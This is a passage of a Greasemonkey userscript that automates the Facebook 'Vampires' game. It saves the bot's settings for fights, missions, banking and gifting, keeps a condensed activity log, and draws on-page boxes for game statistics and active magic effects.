    GM_setValue('autoChestPrio7', document.getElementById('autoChestPrio7').selectedIndex );
    GM_setValue('autoChestPrio8', document.getElementById('autoChestPrio8').selectedIndex );
    GM_setValue('autoPublishAncientChestsSkip', document.getElementById('autoPublishAncientChestsSkip').checked ? 'checked' : '0');
    GM_setValue('autoPublishAncientChestsWait', document.getElementById('autoPublishAncientChestsWait').checked ? 'checked' : '0');

    GM_setValue('autoBank', document.getElementById('autoBank').checked ? 'checked' : '0');
    GM_setValue('autoHeal', document.getElementById('autoHeal').checked ? 'checked' : '0');
    GM_setValue('autoBloodMagic', document.getElementById('autoBloodMagic').checked ? 'checked' : '0');
    GM_setValue('autoCrypt', document.getElementById('autoCrypt').checked ? 'checked' : '0');
    GM_setValue('autoCollector', document.getElementById('autoCollector').checked ? 'checked' : '0');
    GM_setValue('selectCollector', document.getElementById('selectCollector').selectedIndex );
    GM_setValue('rCollectorRehire', document.getElementById('rCollectorRehire').checked ? 'checked' : '0');
    GM_setValue('rCollectorBribe', document.getElementById('rCollectorBribe').checked ? 'checked' : '0');
    GM_setValue('autoRetreat', document.getElementById('autoRetreat').checked ? 'checked' : '0');
    GM_setValue('autoFight', document.getElementById('autoFight').checked ? 'checked' : '0');
    GM_setValue('fightRandom', document.getElementById('fightRandom').checked ? 'checked' : '0');
    GM_setValue('fightLevelRelative', document.getElementById('fightLevelRelative').checked ? 'checked' : '0');
    GM_setValue('rFightList', document.getElementById('rFightList').checked ? 'checked' : '0');
    GM_setValue('fightArena', document.getElementById('fightArena').checked ? 'checked' : '0');
    GM_setValue('fightArenaMinLevel', document.getElementById('fightArenaMinLevel').value);
    GM_setValue('fightArenaLevel', document.getElementById('fightArenaLevel').value);
    GM_setValue('fightArenaLevelRelative', document.getElementById('fightArenaLevelRelative').checked ? 'checked' : '0');
    GM_setValue('fightArenaMinClanSize', document.getElementById('fightArenaMinClanSize').value);
    GM_setValue('fightArenaClanSize', document.getElementById('fightArenaClanSize').value);
    GM_setValue('fightArenaRatingRelative', document.getElementById('fightArenaRatingRelative').checked ? 'checked' : '0');
    GM_setValue('fightArenaRating', document.getElementById('fightArenaRating').value);
    GM_setValue('fightArenaMaxRating', document.getElementById('fightArenaMaxRating').value);	
    GM_setValue('autoLog', document.getElementById('autoLog').checked ? 'checked' : '0');
    GM_setValue('autoLogLength', document.getElementById('autoLogLength').value);
    GM_setValue('autoGamble', document.getElementById('autoGamble').checked ? 'checked' : '0');
    GM_setValue('autoJudge', document.getElementById('autoJudge').checked ? 'checked' : '0');
    GM_setValue('logHealEvents', document.getElementById('logHealEvents').checked ? 'checked' : '0');
    GM_setValue('logAttackEvents', document.getElementById('logAttackEvents').checked ? 'checked' : '0');
    GM_setValue('logFightResults', document.getElementById('logFightResults').checked ? 'checked' : '0');
    GM_setValue('logMissionExecution', document.getElementById('logMissionExecution').checked ? 'checked' : '0');
    GM_setValue('logBloodMagic', document.getElementById('logBloodMagic').checked ? 'checked' : '0');
    GM_setValue('logMinionPurch', document.getElementById('logMinionPurch').checked ? 'checked' : '0');
    GM_setValue('autoPublishBloodMagic', document.getElementById('autoPublishBloodMagic').checked ? 'checked' : '0');
    GM_setValue('autoPublishMissionAssistance', document.getElementById('autoPublishMissionAssistance').checked ? 'checked' : '0');
    GM_setValue('autoPublishFightKill', document.getElementById('autoPublishFightKill').checked ? 'checked' : '0');
    GM_setValue('autoPublishPromoMinion', document.getElementById('autoPublishPromoMinion').checked ? 'checked' : '0');
    GM_setValue('autoPublishLevelUp', document.getElementById('autoPublishLevelUp').checked ? 'checked' : '0');
    GM_setValue('autoPublishCollectorBox', document.getElementById('autoPublishCollectorBox').checked ? 'checked' : '0');
    GM_setValue('autoPublishLimitTimeT1toT2', document.getElementById('autoPublishLimitTimeT1toT2').checked ? 'checked' : '0');
    GM_setValue('autoPublishLimitTimeT1Time', document.getElementById('autoPublishLimitTimeT1Time').value);
    GM_setValue('autoPublishLimitTimeT2Time', document.getElementById('autoPublishLimitTimeT2Time').value);
    GM_setValue('autoPublishLimitTimeT3toT4', document.getElementById('autoPublishLimitTimeT3toT4').checked ? 'checked' : '0');
    GM_setValue('autoPublishLimitTimeT3Time', document.getElementById('autoPublishLimitTimeT3Time').value);
    GM_setValue('autoPublishLimitTimeT4Time', document.getElementById('autoPublishLimitTimeT4Time').value);
    GM_setValue('autoPublishLimitRandom', document.getElementById('autoPublishLimitRandom').checked ? 'checked' : '0');
    GM_setValue('autoPublishLimitRandomPercent', document.getElementById('autoPublishLimitRandomPercent').value);
    GM_setValue('autoPeriodicJudge', document.getElementById('autoPeriodicJudge').checked ? 'checked' : '0');
    GM_setValue('autoJudgeTimerIndexMax', document.getElementById('autoJudgeTimerIndexMax').value);
    GM_setValue('autoJudgeCount', document.getElementById('autoJudgeCount').value);

  //Start Save Autostat Tab Settings
  //Autostat Tab Checkboxes
  saveCheckBoxElementArray([
    'autoStats','autoStatDisable','autoStatAttackFallback','autoStatDefenseFallback','autoStatHealthFallback','autoStatEnergyFallback','autoStatRageFallback'
  ]);
  //Autostat Settings and Validation
  GM_setValue('restAutoStat', 0);
  for (i = 0, iLength=autoStatBases.length; i < iLength; ++i)
    GM_setValue(autoStatBases[i], document.getElementById(autoStatBases[i]).value);
  for (i = 0, iLength=autoStatRatios.length; i < iLength; ++i)
    GM_setValue(autoStatRatios[i], document.getElementById(autoStatRatios[i]).value);
  for (i = 0, iLength=autoStatModes.length; i < iLength; ++i)
    GM_setValue(autoStatModes[i], document.getElementById(autoStatModes[i]).value);
  for (i = 0, iLength=autoStatPrios.length; i < iLength; ++i)
    GM_setValue(autoStatPrios[i], document.getElementById(autoStatPrios[i]).value);

  // Validate the auto-stat setting.
  var autoStatOn = (document.getElementById('autoStats').checked === true);
  for (i = 0, iLength=autoStatBases.length; i < iLength; ++i) {
    if (autoStatOn && isNaN(document.getElementById(autoStatBases[i]).value)) {
      alert('Please enter valid numbers for auto-stat ' + autoStatDescrips[i+1] + ' (Coffin tab). : ' + document.getElementById(autoStatBases[i]).value);
      return;
    }
  }

  for (i = 0, iLength=autoStatRatios.length; i < iLength; ++i) {
    if (autoStatOn && isNaN(document.getElementById(autoStatRatios[i]).value)) {
      alert('Please enter valid numbers for auto-stat ' + autoStatDescrips[i+1] + ' (Coffin tab).');
      return;
    }
  }

  //End Save Autostat Tab Settings

    GM_setValue('missionPriority', document.getElementById('missionPriority').checked ? 'checked' : '0'); 
    GM_setValue('autoAbility', document.getElementById('autoAbility').checked ? 'checked' : '0');
    GM_setValue('rBoxLeft', document.getElementById('rBoxLeft').checked ? 'checked' : '0');
    GM_setValue('rBoxMiddle', document.getElementById('rBoxMiddle').checked ? 'checked' : '0');
    GM_setValue('rBoxRight', document.getElementById('rBoxRight').checked ? 'checked' : '0');
    GM_setValue('leftAlign', document.getElementById('leftAlign').checked ? 'checked' : '0');
    GM_setValue('showStatsBox', document.getElementById('showStatsBox').checked ? 'checked' : '0');
    GM_setValue('autoMinion', document.getElementById('autoMinion').checked ? 'checked' : '0');
    GM_setValue('spendBank', document.getElementById('spendBank').checked ? 'checked' : '0');
    GM_setValue('spendBankKeep', document.getElementById('spendBankKeep').value);
    GM_setValue('refreshPage', document.getElementById('refreshPage').value);
    GM_setValue('selectMission', document.getElementById('selectMission').selectedIndex );
    GM_setValue('bankConfig', document.getElementById('bankConfig').value);
    GM_setValue('bankKeep', document.getElementById('bankKeep').value);
    GM_setValue('r1', document.getElementById('r1').value);
    GM_setValue('r2', document.getElementById('r2').value);
    GM_setValue('JudgeComment', document.getElementById('JudgeComment').value);
    GM_setValue('fightList', document.getElementById('fightList').value);
    GM_setValue('healthLevel', document.getElementById('healthLevel').value);
    GM_setValue('autoFightAvoidLost', document.getElementById('autoFightAvoidLost').checked ? 'checked' : '0');
    GM_setValue('autoFightLossListSize', document.getElementById('autoFightLossListSize').value);

    GM_setValue('autoGoodTargetListSize', document.getElementById('autoGoodTargetListSize').value);
    GM_setValue('goodTargetsMinLevel', document.getElementById('goodTargetsMinLevel').value);
    GM_setValue('goodTargetsMaxLevel', document.getElementById('goodTargetsMaxLevel').value);
    GM_setValue('goodTargetsMinSR', document.getElementById('goodTargetsMinSR').value);
    GM_setValue('goodTargetsMaxSR', document.getElementById('goodTargetsMaxSR').value);

    GM_setValue('showLostLog', document.getElementById('showLostLog').checked ? 'checked' : '0');
    GM_setValue('stayZombie', document.getElementById('stayZombie').checked ? 'checked' : '0');
    GM_setValue('stayZombieRage', document.getElementById('stayZombieRage').value);

    GM_setValue('showGoodTargets', document.getElementById('showGoodTargets').checked ? 'checked' : '0');
    GM_setValue('healthRage', document.getElementById('healthRage').value);
    GM_setValue('fightKeepRage', document.getElementById('fightKeepRage').value);
    GM_setValue('fightExpGain', document.getElementById('fightExpGain').value);
    GM_setValue('fightMinLevel', document.getElementById('fightMinLevel').value);
    GM_setValue('fightLevel', document.getElementById('fightLevel').value);
    GM_setValue('fightMinClanSize', document.getElementById('fightMinClanSize').value);
    GM_setValue('fightClanSize', document.getElementById('fightClanSize').value);
    GM_setValue('fightClanRating', document.getElementById('fightClanRating').value);
    GM_setValue('fightClanMaxRating', document.getElementById('fightClanMaxRating').value);	
    GM_setValue('fightRatingRelative', document.getElementById('fightRatingRelative').checked ? 'checked' : '0');

    GM_setValue('autoFightAttackLimit', document.getElementById('autoFightAttackLimit').checked ? 'checked' : '0');
    GM_setValue('autoFightAttackLimitMax', document.getElementById('autoFightAttackLimitMax').value);
    GM_setValue('autoFightAttackLimitListSize', document.getElementById('autoFightAttackLimitListSize').value);

    GM_setValue('autoBoostRage', document.getElementById('autoBoostRage').checked ? 'checked' : '0');
    GM_setValue('autoBoostRageMin', document.getElementById('autoBoostRageMin').value);
    GM_setValue('autoBoostRageKeep', document.getElementById('autoBoostRageKeep').value);
    GM_setValue('autoBoostFiftyNrg', document.getElementById('autoBoostFiftyNrg').checked ? 'checked' : '0');
    GM_setValue('autoBoostFiftyNrgMin', document.getElementById('autoBoostFiftyNrgMin').value);
    GM_setValue('autoBoostFiftyNrgKeep', document.getElementById('autoBoostFiftyNrgKeep').value);
    GM_setValue('autoBoostHundredNrg', document.getElementById('autoBoostHundredNrg').checked ? 'checked' : '0');
    GM_setValue('autoBoostHundredNrgMin', document.getElementById('autoBoostHundredNrgMin').value);
    GM_setValue('autoBoostHundredNrgKeep', document.getElementById('autoBoostHundredNrgKeep').value);
    GM_setValue('autoBoostWaste', document.getElementById('autoBoostWaste').value);
    GM_setValue('autoBoostHealth', document.getElementById('autoBoostHealth').checked ? 'checked' : '0');
    GM_setValue('autoBoostHealthMin', document.getElementById('autoBoostHealthMin').value);
    GM_setValue('autoBoostHealthKeep', document.getElementById('autoBoostHealthKeep').value);
    GM_setValue('autoBoostRageMinGG', document.getElementById('autoBoostRageMinGG').selectedIndex );
    GM_setValue('autoBoostNRGMinGW', document.getElementById('autoBoostNRGMinGW').selectedIndex );

    GM_setValue('clanList', document.getElementById('clanList').value);
    GM_setValue('clanJudgeFC', document.getElementById('clanJudgeFC').checked ? 'checked' : '0');
    GM_setValue('clanJudgeRating', document.getElementById('clanJudgeRating').selectedIndex );
    GM_setValue('clanJudgeCommentOn', document.getElementById('clanJudgeCommentOn').checked ? 'checked' : '0');
    GM_setValue('clanJudgeComment', document.getElementById('clanJudgeComment').value);

    GM_setValue('clanJudgeLimitTimeT1toT2', document.getElementById('clanJudgeLimitTimeT1toT2').checked ? 'checked' : '0');
    GM_setValue('clanJudgeLimitTimeT1Time', document.getElementById('clanJudgeLimitTimeT1Time').value);
    GM_setValue('clanJudgeLimitTimeT2Time', document.getElementById('clanJudgeLimitTimeT2Time').value);
//    GM_setValue('clanJudgeLimitTimeT3toT4', document.getElementById('clanJudgeLimitTimeT3toT4').checked ? 'checked' : '0');
//    GM_setValue('clanJudgeLimitTimeT3Time', document.getElementById('clanJudgeLimitTimeT3Time').value);
//    GM_setValue('clanJudgeLimitTimeT4Time', document.getElementById('clanJudgeLimitTimeT4Time').value);

    GM_setValue('autoGifting',  document.getElementById('autoGifting').checked ? 'checked' : '0');
    GM_setValue('selectAttribute', document.getElementById('selectAttribute').selectedIndex );
    GM_setValue('JudgeRating', document.getElementById('JudgeRating').selectedIndex );
    GM_setValue('JudgeCount', document.getElementById('JudgeCount').value );    
    GM_setValue('giftingCount', document.getElementById('giftingCount').value);
    GM_setValue('giftingUser', document.getElementById('giftingUser').value);

    GM_setValue('autoEventMission', document.getElementById('autoEventMission').checked ? 'checked' : '0');
    GM_setValue('selectEventMissionA', document.getElementById('selectEventMissionA').selectedIndex );
    GM_setValue('selectEventMissionO', document.getElementById('selectEventMissionO').selectedIndex );
    GM_setValue('eventMasterAll',  document.getElementById('eventMasterAll').checked ? 'checked' : '0');
    GM_setValue('eventMasterOne',  document.getElementById('eventMasterOne').checked ? 'checked' : '0');
    GM_setValue('eventMissionRepeat',  document.getElementById('eventMissionRepeat').checked ? 'checked' : '0');
    // If User has selected Master one stage at a time, make sure the mission is the first in that stage
    if(GM_getValue('eventMasterOne', '') == "checked" && eventMissions[GM_getValue('selectEventMissionA', '')][2] != GM_getValue('selectEventMissionO', '')) {
    	for (var i = 0, iLength=eventMissions.length; i < iLength; ++i) {
		if(eventMissions[i][2] == GM_getValue('selectEventMissionO', '')) {
    	    		GM_setValue('selectEventMissionA', i);
    	    		break;
    	    	}
    	}
    }
    GM_setValue('autoEventReset', document.getElementById('autoEventReset').checked ? 'checked' : '0');

    // Reset Collector Pause
    GM_setValue('autoCollectorPause', '0')

    // Advanced Config   
    GM_setValue('advConfigDelay', document.getElementById('advConfigDelay').value);
    GM_setValue('activeMagicRefreshInterval', document.getElementById('activeMagicRefreshInterval').value);
    GM_setValue('goToIndexInterval', document.getElementById('goToIndexInterval').value);
    GM_setValue('goToStatsInterval', document.getElementById('goToStatsInterval').value);
    GM_setValue('eventActiveOverride', document.getElementById('eventActiveOverride').checked ? 'checked' : '0');




	// show settings saved notification
	document.getElementById('saveNotification').style.visibility = "visible";
    setTimeout("document.location ='"+ "http://apps.facebook.com/"+SCRIPT.name + "/index.php'",1000);
}

function pausePlayer(){
	GM_setValue('paused',1);
	document.location = location.href;
}

function resumePlayer(){
	GM_setValue('paused',0);
	document.location = location.href;
}



function getCurrentdate(){
  // Create a datestamp, formatted for the log.
  var currentTime = new Date();
//  var m_names = new Array('Jan', 'Feb', 'Mar',
//    'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep',
//    'Oct', 'Nov', 'Dec');
//  var timestampdate = m_names[currentTime.getMonth()] + ' ' + currentTime.getDate();

  var month = 1+ parseInt(currentTime.getMonth());
  var timestampdate = currentTime.getDate()+ "/" + month+ "/" +currentTime.getFullYear();
  return timestampdate;
}


function getCurrentTime(){
  // Create a datestamp, formatted for the log.
  var currentTime = new Date();

  // Create a timestamp, formatted for the log.
//  var ampm, hours = currentTime.getHours();
//  if (hours >= 12) {
//    hours = hours - 12;
//    ampm = ' PM';
//  } else {
//    ampm = ' AM';
//  }
//  if (hours == 0) {
//    hours = 12;
//  }
//  var timestamptime = hours + ':' +
//    (currentTime.getMinutes() < 10 ? 0 : '') +
//    currentTime.getMinutes() + ':' +
//    (currentTime.getSeconds() < 10 ? 0 : '') +
//    currentTime.getSeconds() +
//    ampm;

  var hours = currentTime.getHours();
  if (hours == 0) {
    hours = 12;
  }
  var timestamptime = hours + ":" + (currentTime.getMinutes() < 10 ? 0 : '') + currentTime.getMinutes() +" ";
  return timestamptime;
}



// MWAP-style logging (includes condensing of repeated log entries and configurable truncation of log)
// Added from MWAP, with modifications for VWAP
function addToLog(line) {
  if (!debug && !isGMChecked('autoLog')) {
    // Logging is turned off.
    return;
  }

//  // Do not log anything if log filter condition is met
//  if (!isLoggable(line)) {
//    return;
//  }

  var timestampdate = getCurrentdate();
  var timestamptime = getCurrentTime();

  var logLen = vwapLogBox.childNodes.length;

  // Determine whether the new line repeats the most recent one.
  var repeatCount;
  if (logLen) {
    var elt = vwapLogBox.firstChild.childNodes[1];
    if (elt && elt.innerHTML.untag().indexOf(String(line).untag()) == 0) {
      if (elt.innerHTML.match(/\((\d+) times\)$/)) {
        repeatCount = parseInt(RegExp.$1) + 1;
      } else {
        repeatCount = 2;
      }
      line += ' (' + repeatCount + ' times)';
    }
  }

  // Create the new log entry.
  var lineToAdd = document.createElement('div');
//  lineToAdd.className = 'logEvent ' + icon;
  lineToAdd.className = 'logEvent ';
  lineToAdd.innerHTML = '<div class="eventTime" style="display:inline">' + timestampdate + ' ' + timestamptime + '</div><div class="eventBody" style="display:inline">' + line + '</div><div class="clear"></div>';

  // Put it in the log box.
  if (repeatCount) {
    vwapLogBox.replaceChild(lineToAdd, vwapLogBox.firstChild);
  } else {
    vwapLogBox.insertBefore(lineToAdd, vwapLogBox.firstChild);

    // If the log is too large, trim it down.
    var logMax = parseInt(GM_getValue('autoLogLength', 500));
    //GM_log('logLen=' + logLen + ', logMax=' + logMax);
    if (logMax > 0) {
      while (logLen-- > logMax) {
        vwapLogBox.removeChild(vwapLogBox.lastChild);
      }
    }
  }

  // Save the log.
  GM_setValue('itemLog', vwapLogBox.innerHTML);
}

function refreshStatsBox(){

	var statsBoxHeader = document.getElementById('statsBoxHeader');
	if (!statsBoxHeader) {
		var statsBoxHeader = makeElement("div", statsBox,{"style":"position: absolute; left:"+(bannerLeft-bannerLeftPosition+6)+"px; top: "+(3)+"px; font-size: 8pt; color: #FFFFFF;"});
    		statsBoxHeader.id = 'statsBoxHeader';
	}
	statsBoxHeader.innerHTML  = "Statistics:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(since: "+ GM_getValue('statsLastClearTime', '[unknown]') +")";

	var statsFightSR = document.getElementById('statsFightSR');
	if (!statsFightSR) {
		var statsFightSR = makeElement("div", statsBox,{"style":"position: absolute; left:"+(bannerLeft-bannerLeftPosition+11)+"px; top: "+(23)+"px; font-size: 8pt; color: #FFFFFF;"});
    		statsFightSR.id = 'statsFightSR';
	}
	statsFightSR.innerHTML  = "Fight SR: " + GM_getValue('mySkillRanking', 0);

	var statsAttacksWins = document.getElementById('statsAttacksWins');
	if (!statsAttacksWins) {
		var statsAttacksWins = makeElement("div", statsBox,{"style":"position: absolute; left:"+(bannerLeft-bannerLeftPosition+11)+"px; top: "+(38)+"px; font-size: 8pt; color: #FFFFFF;"});
    		statsAttacksWins.id = 'statsAttacksWins';
	}
	statsAttacksWins.innerHTML  = "Fight Wins: " + GM_getValue('statsAttacksWins', 0);

	var statsAttacksLosses = document.getElementById('statsAttacksLosses');
	if (!statsAttacksLosses) {
		var statsAttacksLosses = makeElement("div", statsBox,{"style":"position: absolute; left:"+(bannerLeft-bannerLeftPosition+11)+"px; top: "+(53)+"px; font-size: 8pt; color: #FFFFFF;"});
    		statsAttacksLosses.id = 'statsAttacksLosses';
	}
	statsAttacksLosses.innerHTML  = "Fight Losses: " + GM_getValue('statsAttacksLosses', 0);

	var statsAttacksExp = document.getElementById('statsAttacksExp');
	if (!statsAttacksExp) {
		var statsAttacksExp = makeElement("div", statsBox,{"style":"position: absolute; left:"+(bannerLeft-bannerLeftPosition+11)+"px; top: "+(68)+"px; font-size: 8pt; color: #FFFFFF;"});
    		statsAttacksExp.id = 'statsAttacksExp';
	}
	statsAttacksExp.innerHTML  = "Fight +Exp: " + GM_getValue('statsAttacksExp', 0);

	if ((GM_getValue('statsAttacksWins', 0) + GM_getValue('statsAttacksLosses', 0)) > 0) {
		var fightExpGain = (Math.round((GM_getValue('statsAttacksExp', 0) / (GM_getValue('statsAttacksWins', 0) + GM_getValue('statsAttacksLosses', 0)))*100))/100;
	} else {
		var fightExpGain = "???";
	}

	var statsAttacksExpPerFight = document.getElementById('statsAttacksExpPerFight');
	if (!statsAttacksExpPerFight) {
		var statsAttacksExpPerFight = makeElement("div", statsBox,{"style":"position: absolute; left:"+(bannerLeft-bannerLeftPosition+11)+"px; top: "+(83)+"px; font-size: 8pt; color: #FFFFFF;"});
    		statsAttacksExpPerFight.id = 'statsAttacksExpPerFight';
	}
	statsAttacksExpPerFight.innerHTML  = "Exp/Fight: " + fightExpGain;




	var statsArenaSR = document.getElementById('statsArenaSR');
	if (!statsArenaSR) {
		var statsArenaSR = makeElement("div", statsBox,{"style":"position: absolute; left:"+(bannerLeft-bannerLeftPosition+136)+"px; top: "+(23)+"px; font-size: 8pt; color: #FFFFFF;"});
    		statsArenaSR.id = 'statsArenaSR';
	}
	statsArenaSR.innerHTML  = "Arena SR: " + GM_getValue('mySkillRankingArena', 0);

	var statsArenaWins = document.getElementById('statsArenaWins');
	if (!statsArenaWins) {
		var statsArenaWins = makeElement("div", statsBox,{"style":"position: absolute; left:"+(bannerLeft-bannerLeftPosition+136)+"px; top: "+(38)+"px; font-size: 8pt; color: #FFFFFF;"});
    		statsArenaWins.id = 'statsArenaWins';
	}
	statsArenaWins.innerHTML  = "Arena Wins: " + GM_getValue('statsArenaWins', 0);

	var statsArenaLosses = document.getElementById('statsArenaLosses');
	if (!statsArenaLosses) {
		var statsArenaLosses = makeElement("div", statsBox,{"style":"position: absolute; left:"+(bannerLeft-bannerLeftPosition+136)+"px; top: "+(53)+"px; font-size: 8pt; color: #FFFFFF;"});
    		statsArenaLosses.id = 'statsArenaLosses';
	}
	statsArenaLosses.innerHTML  = "Arena Losses: " + GM_getValue('statsArenaLosses', 0);

	var statsArenaExp = document.getElementById('statsArenaExp');
	if (!statsArenaExp) {
		var statsArenaExp = makeElement("div", statsBox,{"style":"position: absolute; left:"+(bannerLeft-bannerLeftPosition+136)+"px; top: "+(68)+"px; font-size: 8pt; color: #FFFFFF;"});
    		statsArenaExp.id = 'statsArenaExp';
	}
	statsArenaExp.innerHTML  = "Arena +Exp: " + GM_getValue('statsArenaExp', 0);

	if ((GM_getValue('statsArenaWins', 0) + GM_getValue('statsArenaLosses', 0)) > 0) {
		var arenaExpGain = (Math.round((GM_getValue('statsArenaExp', 0) / (GM_getValue('statsArenaWins', 0) + GM_getValue('statsArenaLosses', 0)))*100))/100;
	} else {
		var arenaExpGain = "???";
	}

	var statsArenaExpPerFight = document.getElementById('statsArenaExpPerFight');
	if (!statsArenaExpPerFight) {
		var statsArenaExpPerFight = makeElement("div", statsBox,{"style":"position: absolute; left:"+(bannerLeft-bannerLeftPosition+136)+"px; top: "+(83)+"px; font-size: 8pt; color: #FFFFFF;"});
    		statsArenaExpPerFight.id = 'statsArenaExpPerFight';
	}
	statsArenaExpPerFight.innerHTML  = "Exp/Fight: " + arenaExpGain;


	var statsMissions = document.getElementById('statsMissions');
	if (!statsMissions) {
		var statsMissions = makeElement("div", statsBox,{"style":"position: absolute; left:"+(bannerLeft-bannerLeftPosition+261)+"px; top: "+(23)+"px; font-size: 8pt; color: #FFFFFF;"});
    		statsMissions.id = 'statsMissions';
	}
	statsMissions.innerHTML  = "Missions: " + GM_getValue('statsMissions', 0);

	var missionEnergySpent = document.getElementById('missionEnergySpent');
	if (!missionEnergySpent) {
		var missionEnergySpent = makeElement("div", statsBox,{"style":"position: absolute; left:"+(bannerLeft-bannerLeftPosition+261)+"px; top: "+(38)+"px; font-size: 8pt; color: #FFFFFF;"});
    		missionEnergySpent.id = 'missionEnergySpent';
	}
	missionEnergySpent.innerHTML  = "Energy Spent: " + GM_getValue('missionEnergySpent', 0);

	var missionExpGained = document.getElementById('missionExpGained');
	if (!missionExpGained) {
		var missionExpGained = makeElement("div", statsBox,{"style":"position: absolute; left:"+(bannerLeft-bannerLeftPosition+261)+"px; top: "+(53)+"px; font-size: 8pt; color: #FFFFFF;"});
    		missionExpGained.id = 'missionExpGained';
	}
	if (GM_getValue('missionEnergySpent', 0) > 0) {
		var missionExpGain = (Math.round((GM_getValue('missionExpGained', 0) / GM_getValue('missionEnergySpent', 0))*100))/100;
	} else {
		var missionExpGain = "???";
	}
	missionExpGained.innerHTML  = "Exp Gained: " + GM_getValue('missionExpGained', 0) + "  (" + missionExpGain +")";


	var statsClan = document.getElementById('statsClan');
	if (!statsClan) {
		var statsClan = makeElement("div", statsBox,{"style":"position: absolute; left:"+(bannerLeft-bannerLeftPosition+441)+"px; top: "+(23)+"px; font-size: 8pt; color: #FFFFFF;"});
    		statsClan.id = 'statsClan';
	}
	statsClan.innerHTML  = "Clan: " + GM_getValue('myClan', 0);

	var statsJudges = document.getElementById('statsJudges');
	if (!statsJudges) {
		var statsJudges = makeElement("div", statsBox,{"style":"position: absolute; left:"+(bannerLeft-bannerLeftPosition+441)+"px; top: "+(38)+"px; font-size: 8pt; color: #FFFFFF;"});
    		statsJudges.id = 'statsJudges';
	}
	statsJudges.innerHTML  = "Judges: " + GM_getValue('statsJudges', 0);

	var statsGiftsGiven = document.getElementById('statsGiftsGiven');
	if (!statsGiftsGiven) {
		var statsGiftsGiven = makeElement("div", statsBox,{"style":"position: absolute; left:"+(bannerLeft-bannerLeftPosition+441)+"px; top: "+(53)+"px; font-size: 8pt; color: #FFFFFF;"});
    		statsGiftsGiven.id = 'statsGiftsGiven';
	}
	statsGiftsGiven.innerHTML  = "Gifts: " + GM_getValue('statsGiftsGiven', 0);


	return true;
}


function resetStatsBox(){
    GM_setValue('statsAttacksWins', 0);
    GM_setValue('statsAttacksLosses', 0);
    GM_setValue('statsAttacksExp', 0);

    GM_setValue('statsArenaWins', 0);
    GM_setValue('statsArenaLosses', 0);
    GM_setValue('statsArenaExp', 0);

    GM_setValue('statsMissions', 0);
    GM_setValue('missionEnergySpent', 0);
    GM_setValue('missionExpGained', 0);

    GM_setValue('statsJudges', 0);
    GM_setValue('statsGiftsGiven', 0);

    var timestampdate = getCurrentdate();
    var timestamptime = getCurrentTime();
    GM_setValue('statsLastClearTime', timestampdate + ' ' + timestamptime);

    refreshStatsBox();
    alert('Stats Cleared');
}

function refreshActiveMagicBox(){

    	var now = Math.floor(new Date().getHours() * 3600 + new Date().getMinutes() * 60);

	var activeMagicBoxHeader = document.getElementById('activeMagicBoxHeader');
	if (!activeMagicBoxHeader) {
		var activeMagicBoxHeader = makeElement("div", activeMagicBox,{"style":"position: absolute; left:"+(bannerLeft-bannerLeftPosition+6)+"px; top: "+(3)+"px; font-size: 8pt; color: #FFFFFF;"});
    		activeMagicBoxHeader.id = 'activeMagicBoxHeader';
	}
	activeMagicBoxHeader.innerHTML  = "<a href='http://apps.facebook.com/vampiresgame/stats.php' onclick='return do_ajax(\"mainDiv\", \"buffs.php\");'>Active Magic</a>";


	var activeMagicBoxWCDiv = document.getElementById('activeMagicBoxWCDiv');
	if (!activeMagicBoxWCDiv) {
		var activeMagicBoxWCDiv = makeElement("div", activeMagicBox,{"style":"position: absolute; left:"+(bannerLeft-bannerLeftPosition+108)+"px; top: "+(3)+"px; font-size: 8pt; color: "+(isGMEqual ('activeMagicWCon', 'true') ? "#FA5858" : "#888888" )+";"});
    		activeMagicBoxWCDiv.id = 'activeMagicBoxWCDiv';
	}
	activeMagicBoxWCDiv.innerHTML  = "Curse "+GM_getValue('activeMagicWCStrength', '?')+" ("+(GM_getValue('activeMagicWCExpireTime', 0)-now>0 ? timeLeftHHMM('activeMagicWCExpireTime') : '0:00')+")";
	activeMagicBoxWCDiv.setAttribute("title", "Witch's Curse: "+GM_getValue('activeMagicWCStrength', '?')+" to base damage");



	var activeMagicBoxGGDiv = document.getElementById('activeMagicBoxGGDiv');
	if (!activeMagicBoxGGDiv) {
		var activeMagicBoxGGDiv = makeElement("div", activeMagicBox,{"style":"position: absolute; left:"+(bannerLeft-bannerLeftPosition+8)+"px; top: "+(18)+"px; font-size: 8pt; color: "+(isGMEqual ('activeMagicGGon', 'true') ? "#58FA58" : "#888888" )+";"});
    		activeMagicBoxGGDiv.id = 'activeMagicBoxGGDiv';
	}
	activeMagicBoxGGDiv.innerHTML  = "GG "+GM_getValue('activeMagicGGStrength', '?')+" ("+(GM_getValue('activeMagicGGExpireTime', 0)-now>0 ? timeLeftHHMM('activeMagicGGExpireTime') : '0:00')+")";
	activeMagicBoxGGDiv.setAttribute("title", "Glyph of Guile: +"+GM_getValue('activeMagicGGStrength', '?')+" XP from combat");

	var activeMagicBoxBLDiv = document.getElementById('activeMagicBoxBLDiv');
	if (!activeMagicBoxBLDiv) {
		var activeMagicBoxBLDiv = makeElement("div", activeMagicBox,{"style":"position: absolute; left:"+(bannerLeft-bannerLeftPosition+8)+"px; top: "+(33)+"px; font-size: 8pt; color: "+(isGMEqual ('activeMagicBLon', 'true') ? "#58FA58" : "#888888" )+";"});
    		activeMagicBoxBLDiv.id = 'activeMagicBoxBLDiv';
	}
	activeMagicBoxBLDiv.innerHTML  = "BL "+GM_getValue('activeMagicBLStrength', '?')+" ("+(GM_getValue('activeMagicBLExpireTime', 0)-now>0 ? timeLeftHHMM('activeMagicBLExpireTime') : '0:00')+")";
	activeMagicBoxBLDiv.setAttribute("title", "Bloodlust: +"+GM_getValue('activeMagicBLStrength', '?')+" Blood from Missions");

	var activeMagicBoxWGDiv = document.getElementById('activeMagicBoxWGDiv');
	if (!activeMagicBoxWGDiv) {
		var activeMagicBoxWGDiv = makeElement("div", activeMagicBox,{"style":"position: absolute; left:"+(bannerLeft-bannerLeftPosition+8)+"px; top: "+(48)+"px; font-size: 8pt; color: "+(isGMEqual ('activeMagicWGon', 'true') ? "#58FA58" : "#888888" )+";"});
    		activeMagicBoxWGDiv.id = 'activeMagicBoxWGDiv';
	}
	activeMagicBoxWGDiv.innerHTML  = "WG "+GM_getValue('activeMagicWGStrength', '?')+" ("+(GM_getValue('activeMagicWGExpireTime', 0)-now>0 ? timeLeftHHMM('activeMagicWGExpireTime') : '0:00')+")";
	activeMagicBoxWGDiv.setAttribute("title", "Warlock's Gift: Meters refill "+GM_getValue('activeMagicWGStrength', '?')+" faster");

